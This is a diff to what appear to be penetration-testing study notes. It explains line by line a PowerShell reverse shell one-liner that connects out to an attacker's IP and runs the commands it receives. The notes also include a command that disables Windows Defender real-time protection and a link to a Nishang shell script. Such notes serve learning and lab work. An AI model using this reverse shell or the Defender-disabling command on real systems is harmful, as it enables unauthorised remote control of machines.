@@ -30,11 +30,18 @@ powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.
 ```
 > Sometimes we might be able to disable Windows defender Virus & Threat protection, allowing us to run the above:
 > `Set-MpPreference -DisableRealtimeMonitoring $true`
+> A script version of a similar process is available [here](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)
 
 > 1. `powershell -nop -c` creates a no profile (`nop`) and executes the following code (`-c`)
-> 2. First we connect to a TCP socket and set it as the client
-> 3. Now open the stream with `GetStream`
-> 4. Create an empty byte stream to send to our TCP listening waiting
+> 2. `$client = New-Object System.Net.Sockets.TCPClient('<ip>', <port>);` First we connect to a TCP socket and set it as the client
+> 3. `$client.GetStream();` Now open the stream with `GetStream`
+> 4. `[byte[]]$bytes = 0..65535|%{0};` Create an empty byte stream to send to our TCP listener
+> 5. `while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)` starts a loop to read through the bytes buffer
+> 6. `{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);` This encodes the bytes buffer into ASCII characters
+> 7. `$sendback = (iex $data 2>&1 | Out-String );` invokes the data and redirects its output to be turned from an object to a string
+> 8. `$sb2 = $sb + 'PS ' + (pwd).Path + '> ';` this creates the prompt on the end of the data
+> 9. `$sendbyte ...;$s.Write(...);$s.Flush(...)};` creates the final encoded byte stream that we will send via the TCP socket
+> 10. `$client.Close()"` will close the connection at the end when its terminated
 
 ## Bind Shells
 Unlike a reverse shell, a Bind shell connects us to the *targets'* listening port. This means we are connecting to the target rather than them connecting to us (the opposite direction to a RS).
